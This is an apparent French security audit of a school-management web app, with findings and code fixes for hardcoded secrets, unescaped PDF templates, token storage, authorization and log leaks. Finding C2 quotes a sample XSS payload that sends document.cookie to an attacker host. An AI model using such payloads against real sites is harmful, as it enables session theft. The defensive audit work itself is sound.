# 02 — Audit Cybersécurité

> Périmètre : authentification, autorisation, secrets, validation entrées, headers HTTP, multi-tenant, audit trail, fuites d'information.

**Note globale : 6/10** — fondations propres mais 3 failles critiques avant déploiement multi-tenant.

---

## ✅ Maturité globale

- **JWT fail-fast** : `process.exit(1)` si `JWT_SECRET` absent ([server.ts:36](../backend/src/server.ts#L36))
- **Multi-tenant strict** : `etablissement_id` extrait du JWT à chaque requête, filtre systématique
- **bcrypt cost 10** ([auth.service.ts:59](../backend/src/modules/auth/auth.service.ts#L59)) — correct pour 2026
- **Refresh tokens en DB** révocables ([schema.prisma:700-712](../backend/prisma/schema.prisma#L700))
- **Headers sécurité** standards : `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`, `HSTS` en prod ([server.ts:76-85](../backend/src/server.ts#L76))
- **Rate-limit global** 100 req/15 min + rate-limit login 5/min + refresh 10/min
- **Zod validation** systématique aux frontières HTTP
- **Payload JWT validé** par Zod à chaque requête ([auth.middleware.ts:13](../backend/src/middlewares/auth.middleware.ts#L13))
- **`escapeHtml()`** appliqué dans les templates de bulletin

---

## 🔴 Critiques (P0 — à corriger avant prod multi-tenant)

### C1 — `QR_SECRET` hardcodé en fallback

**Fichiers :**
- [eleves.service.ts:7](../backend/src/modules/eleves/eleves.service.ts#L7)
- [documents.service.ts:7](../backend/src/modules/documents/documents.service.ts#L7)

```ts
const QR_SECRET = process.env.QR_SECRET ?? 'daaragest-qr-secret-change-in-prod';
```

**Problème :**
- Variable **non listée** dans [.env.example](../backend/.env.example)
- Si oubliée en production, la signature HMAC des QR codes (cartes élèves & professeurs) devient **publique et prévisible**
- Un attaquant peut forger un QR valide pour n'importe quel élève → bypass du futur pointage NFC

**Fix :**
```ts
// Au démarrage de server.ts, à côté de JWT_SECRET :
const qrSecret = process.env.QR_SECRET;
if (!qrSecret) {
  console.error('[ERREUR] QR_SECRET non défini.');
  process.exit(1);
}
```
Et ajouter à `.env.example`.

**Effort :** 5 min · **Impact :** bloque la forge de cartes QR.

---

### C2 — XSS dans la génération de PDF (documents)

**Fichier :** [documents.service.ts:357-362](../backend/src/modules/documents/documents.service.ts#L357)

```ts
function replaceVars(html: string, vars: Record<string, string>): string {
  return Object.entries(vars).reduce(
    (acc, [k, v]) => acc.replaceAll(`{{${k}}}`, v ?? ''),
    html,
  );
}
```

**Problème :**
- Aucune variable n'est échappée — `NOM_PRENOM_ELEVE`, `NOM_TUTEUR`, `lieu_naissance`, `MOTIF`, `ETABLISSEMENT_DESTINATION` injectés bruts
- Bulletins protégés par `escapeHtml()`, **mais pas les documents officiels** (certificat, attestation, fiche transfert…)
- Un nom contenant `<img src=x onerror="fetch('//attacker/'+document.cookie)">` est **exécuté dans Puppeteer**
- Puppeteer ne tourne pas en sandbox → SSRF, lecture `file://`, exfiltration

**Aggravation :** [documents.service.ts:54-58](../backend/src/modules/documents/documents.service.ts#L54) insère `etab.logo_url`, `signature_url`, `cachet_url` bruts dans des `<img src="...">`. Un admin peut injecter `" onerror="…"` via Paramètres.

**Fix :**
```ts
function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

// Variables qui contiennent volontairement du HTML construit côté serveur :
const HTML_KEYS = new Set(['LOGO', 'SIGNATURE', 'CACHET', 'PHOTO_ELEVE', 'PHOTO_PROF',
                            'QR_CODE_ELEVE', 'QR_CODE_PROF', 'TABLEAU_NOTES',
                            'TABLEAU_EMPLOI_DU_TEMPS', 'TABLEAU_PLANNING', 'TABLEAU_ELEVES']);

function replaceVars(html: string, vars: Record<string, string>): string {
  return Object.entries(vars).reduce(
    (acc, [k, v]) => acc.replaceAll(`{{${k}}}`, HTML_KEYS.has(k) ? (v ?? '') : escapeHtml(v ?? '')),
    html,
  );
}
```

Pour `LOGO/SIGNATURE/CACHET`, valider que `etab.logo_url` est une URL bien formée + même origine côté admin.

**Effort :** 30 min · **Impact :** ferme un vecteur XSS/SSRF.

---

### C3 — Token JWT renvoyé dans le body ET stocké en localStorage

**Fichiers :**
- [auth.controller.ts:33](../backend/src/modules/auth/auth.controller.ts#L33)
- [authStore.ts](../frontend/src/store/authStore.ts) (persist)

**Problème :**
- Le backend renvoie `{ user, token }` ET pose un cookie httpOnly
- Le frontend persist `user` dans `localStorage` via Zustand
- Le cookie httpOnly devient cosmétique : un XSS suffit à exfiltrer le token (et le projet a déjà des secrets en local pour l'attaquer cf. C2)
- Le projet a déjà des **refresh tokens DB révocables** → pas besoin de stocker le token long terme côté client

**Fix :**
1. Backend : retirer `token` de `reply.send({ user, token })`
2. Frontend : ne persister que `user.id`, `user.role`, `user.langue`, `user.theme` (utile au theming initial). Recharger le profil via `/auth/me` au mount du Layout.
3. Le token vit en mémoire React le temps de la session, le refresh-token cookie httpOnly fait son travail.

**Effort :** 1 j · **Impact :** réduit drastiquement la surface XSS → token-theft.

---

### C4 — `COOKIE_DOMAIN` défaut codé en dur sur un déploiement spécifique

**Fichier :** [auth.controller.ts:14](../backend/src/modules/auth/auth.controller.ts#L14)

```ts
domain: isProd ? (process.env.COOKIE_DOMAIN ?? '.dg.sakai.sn') : undefined,
```

**Problème :**
- Pour tout déploiement non-`dg.sakai.sn` qui oublie `COOKIE_DOMAIN`, le cookie est scopé à un domaine que l'app ne contrôle pas → session inopérante
- Si l'attaquant contrôle un sous-domaine de `dg.sakai.sn`, possibilité de vol de session

**Fix :**
```ts
domain: isProd ? process.env.COOKIE_DOMAIN : undefined,
```
Et au démarrage, warn si `NODE_ENV=production` mais `COOKIE_DOMAIN` undefined.

**Effort :** 5 min · **Impact :** bloque le scoping cookie sur le mauvais domaine.

---

## 🟠 Hautes (P1)

### H1 — Autorisation horizontale faible (notes / bulletins / évaluations)

**Fichier :** [notes.routes.ts:7](../backend/src/modules/notes/notes.routes.ts#L7)

Routes en `ROLE_GROUPS.ACADEMIQUE` (admin, directeur, gestionnaire, **professeur**) → tout professeur peut saisir/modifier des notes pour **n'importe quelle classe et matière** de son établissement. Aucune vérification que `(prof, classe, matiere) ∈ ProfMatiereClasse`.

Le flag `insertOnly` ([notes.controller.ts:32](../backend/src/modules/notes/notes.controller.ts#L32)) empêche d'écraser mais permet d'ajouter partout. Idem pour `evaluations`, `bulletins/observation`, `absences/bulk`.

**Fix :**
```ts
// Dans notes.service.ts, en début de bulkUpsertNotes pour role='professeur' :
if (role === 'professeur' && classe_id) {
  const assigned = await prisma.profMatiereClasse.findFirst({
    where: { professeur: { utilisateur_id: acteurId }, classe_id, matiere_id: { in: matiereIds } },
  });
  if (!assigned) throw new Error('Vous n\'enseignez pas cette matière dans cette classe');
}
```

**Effort :** 1 j (notes + bulletins/observation + absences/bulk + évaluations) · **Impact :** ferme la falsification de notes inter-classes.

---

### H2 — Token portail parent : 1 an, partageable, pas de rate-limit

**Fichiers :**
- [portail-parent.service.ts:3](../backend/src/modules/portail-parent/portail-parent.service.ts#L3) — `TOKEN_DUREE_MS = 365 * 24 * 60 * 60 * 1000`
- [portail-parent.routes.ts:11](../backend/src/modules/portail-parent/portail-parent.routes.ts#L11) — route publique sans `rateLimit` spécifique

**Problème :**
- Lien WhatsApp/SMS partagé reste valable 1 an, expose notes + finances + absences + adresse parent + paiements
- Pas de révocation auto en fin d'année scolaire
- Pas de log d'accès (qui a vu quoi, depuis quelle IP, à quelle heure)
- Énumération UUID v4 = 1.5×10³⁶ combinaisons → OK
- Mais un lien qui fuit (WhatsApp leak, photo de l'écran partagée…) reste exploitable longtemps

**Fix :**
1. Expiration alignée sur `AnneeScolaire.date_fin` au lieu de 365 j
2. Rate-limit spécifique sur `/acces/:token` : 30 req/min/IP
3. Logger les accès dans `AuditLog` (token, IP, UA, timestamp)
4. Ajouter un bouton "Révoquer tous les anciens liens" dans l'UI

**Effort :** 2 h · **Impact :** limite la fenêtre d'exploitation d'un lien fuité.

---

### H3 — Rotation refresh token trop agressive (anti-multi-device)

**Fichier :** [auth.service.ts:87](../backend/src/modules/auth/auth.service.ts#L87)

```ts
await prisma.refreshToken.updateMany({
  where: { utilisateur_id, revoked: false },
  data: { revoked: true }
});
```

**Problème :**
- À chaque `creerRefreshToken`, **tous** les autres tokens actifs sont révoqués
- Un login sur tablette tue la session du téléphone
- Sur race condition (deux onglets refresh simultanément), un est éjecté
- **Bloquant pour l'app mobile React Native** prévue en roadmap

**Fix :** lier le refresh token à un identifiant de device (UUID stocké en localStorage + envoyé en cookie ou body). Ne révoquer que les tokens du même `device_id`.

**Effort :** 0.5 j · **Impact :** débloque le multi-device et l'app mobile.

---

### H4 — Logger Fastify par défaut (fuite mots de passe)

**Fichier :** [server.ts:43](../backend/src/server.ts#L43) — `Fastify({ logger: true })`.

**Problème :** Fastify peut logger les bodies en debug ; surtout, en production sans **redaction**, les payloads `POST /auth/login` et `PUT /auth/change-password` peuvent contenir les mots de passe en clair dans les logs.

**Fix :**
```ts
const fastify = Fastify({
  logger: {
    redact: {
      paths: [
        'req.body.mot_de_passe',
        'req.body.ancien_mot_de_passe',
        'req.body.nouveau_mot_de_passe',
        'res.headers["set-cookie"]',
        'req.headers.cookie',
        'req.headers.authorization',
      ],
      remove: true,
    },
  },
});
```

**Effort :** 15 min · **Impact :** stoppe la fuite secrets vers les logs.

---

### H5 — `setErrorHandler` fuite les messages Prisma

**Fichier :** [server.ts:132-137](../backend/src/server.ts#L132)

```ts
fastify.setErrorHandler((error, _request, reply) => {
  fastify.log.error(error);
  reply.status(error.statusCode ?? 500).send({
    error: error.message ?? 'Erreur interne du serveur',
  });
});
```

**Problème :** Un `PrismaClientKnownRequestError` expose le nom de la table, la contrainte unique violée, voire la valeur en conflit (`Unique constraint failed on the fields: ('email')`).

**Fix :**
```ts
import { Prisma } from '@prisma/client';

fastify.setErrorHandler((error, request, reply) => {
  fastify.log.error({ err: error, url: request.url });
  if (error instanceof Prisma.PrismaClientKnownRequestError) {
    return reply.status(400).send({ error: 'Données invalides' });
  }
  if (error.statusCode && error.statusCode < 500) {
    return reply.status(error.statusCode).send({ error: error.message });
  }
  return reply.status(500).send({ error: 'Erreur interne du serveur' });
});
```

**Effort :** 15 min · **Impact :** réduit la divulgation d'info technique.

---

## 🟡 Moyennes (P2)

| # | Sujet | Fichier |
|---|---|---|
| M1 | Pas de Content-Security-Policy (manque dans onSend) | [server.ts:76](../backend/src/server.ts#L76) |
| M2 | Mot de passe min 8 chars **sans complexité** (pas de regex maj/min/chiffre/spécial) | [auth.service.ts:58](../backend/src/modules/auth/auth.service.ts#L58) |
| M3 | `bulkSupprimerEleves` = **hard delete** en cascade (notes, bulletins, paiements). Admin-only mais sans archivage | [eleves.service.ts:312-319](../backend/src/modules/eleves/eleves.service.ts#L312) |
| M4 | `notif_paiement_retard / notif_messages` activés par défaut → broadcast non maîtrisé | [schema.prisma:211-213](../backend/prisma/schema.prisma#L211) |
| M5 | `audit.ts` *non bloquant* : échec de log silencieux → traçabilité partielle | [audit.ts:18](../backend/src/utils/audit.ts#L18) |
| M6 | Pas d'audit log sur `bulletin observation`, `note update`, `paiement update` | divers services |
| M7 | Pas de protection CSRF explicite (SameSite + Bearer atténuent, mais cookie domain partagé peut neutraliser) | — |
| M8 | Identifiants seed `Admin123!`, `Directeur123!`, `Prof123!` prévisibles malgré `must_change_password: true` | [seed.ts:149](../backend/prisma/seed.ts#L149) |
| M9 | Pas de monitoring brute-force progressif (verrouillage IP après N échecs) | — |
| M10 | Frontend `ProtectedRoute` ne consulte que `role` du store local — bypassable par édition localStorage (mais backend RBAC compense) | [ProtectedRoute.tsx](../frontend/src/components/ui/ProtectedRoute.tsx) |

---

## 🎯 Priorisation

| Priorité | Action | Effort | Risque évité |
|---|---|---|---|
| 🔴 P0 | **C1** : fail-fast sur `QR_SECRET` | 5 min | Forge de cartes QR |
| 🔴 P0 | **C2** : escapeHtml dans `documents.replaceVars` | 30 min | XSS/SSRF via Puppeteer |
| 🔴 P0 | **C4** : retirer le défaut `.dg.sakai.sn` | 5 min | Vol session multi-déploiement |
| 🟠 P1 | **H1** : Policy notes/bulletins basée sur ProfMatiereClasse | 1 j | Tampering inter-classes |
| 🟠 P1 | **C3** : token JWT en mémoire seule (pas localStorage) | 1 j | Exfiltration via XSS |
| 🟠 P1 | **H4** : redaction logger Fastify | 15 min | Fuite mots de passe en log |
| 🟠 P1 | **H5** : sanitisation `setErrorHandler` | 15 min | Fuite info Prisma |
| 🟠 P1 | **H2** : expiration portail-parent + rate-limit + audit | 2 h | Lien viral hors-contrôle |
| 🟡 P2 | **H3** : refresh token rotation par device | 0.5 j | Débloque app mobile |
| 🟡 P2 | **M2** : complexité mots de passe | 30 min | Brute-force résistance |
| 🟡 P2 | **M3** : soft-delete pour `bulkSupprimerEleves` | 2 h | Récupération possible |
| 🟡 P2 | **M5+M6** : étendre audit log aux PUT/PATCH critiques | 0.5 j | Traçabilité réglementaire |
| 🟢 P3 | **M1** : Content-Security-Policy | 1 h | XSS defense in depth |

---

## 📊 Verdict cybersécurité

**Fondations propres** mais les 3 P0 sont des **bloquants avant déploiement multi-tenant** : ils prennent moins de 1 h cumulé à corriger et ferment des vecteurs concrets.

H1 (autorisation horizontale) est la **vraie dette** : un professeur peut techniquement modifier les notes d'un autre prof. Tant que c'est mono-établissement avec une équipe restreinte qui se connaît, le risque est faible. Dès que l'app sert un réseau d'écoles ou des établissements >50 personnes, il devient critique.

Une fois P0 + P1 traités (~3 j), la posture sécurité monte à **~8/10**, niveau acceptable pour un produit SaaS éducatif en production.
